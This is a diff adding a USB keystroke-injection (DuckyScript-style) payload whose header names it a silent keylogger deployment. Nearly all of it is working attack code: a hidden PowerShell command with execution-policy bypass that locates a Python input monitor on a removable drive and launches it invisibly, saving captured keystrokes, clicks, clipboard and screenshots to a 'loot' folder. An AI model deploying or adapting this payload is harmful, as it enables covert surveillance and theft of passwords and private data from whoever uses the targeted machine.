@@ -1,0 +1,15 @@
+REM ============================================================================
+REM  KEYLOGGER DEPLOY — Silent Input Monitor Installation
+REM  ============================================================================
+REM  Deploys the Python-based input monitor from the USB drive.
+REM  Captures keystrokes, mouse clicks, clipboard, screenshots.
+REM  Runs completely hidden with no taskbar presence.
+REM  
+REM  FLLC | Authorized use only.
+REM ============================================================================
+
+DELAY 1500
+GUI r
+DELAY 600
+STRING powershell -W Hidden -NoP -Exec Bypass -C "$d=(Get-WmiObject Win32_LogicalDisk -F 'DriveType=2'|%{$_.DeviceID}|?{Test-Path \"$_\\payloads\\input_monitor.py\"}|Select -First 1);if(!$d){$d=(Get-WmiObject Win32_LogicalDisk -F 'DriveType=2'|%{$_.DeviceID}|Select -First 1)};$py=$null;'pythonw','python','python3','py'|%{if(Get-Command $_ -ea 0){$py=$_;break}};if($py-and $d){$script=\"$d\\payloads\\input_monitor.py\";if(!(Test-Path $script)){$script=\"$d\\input_monitor.py\"};if(Test-Path $script){Start-Process $py -ArgumentList \"`\"$script`\" --output `\"$d\\loot`\" --silent --flush 10 --max-size 500\" -WindowStyle Hidden}}"
+ENTER
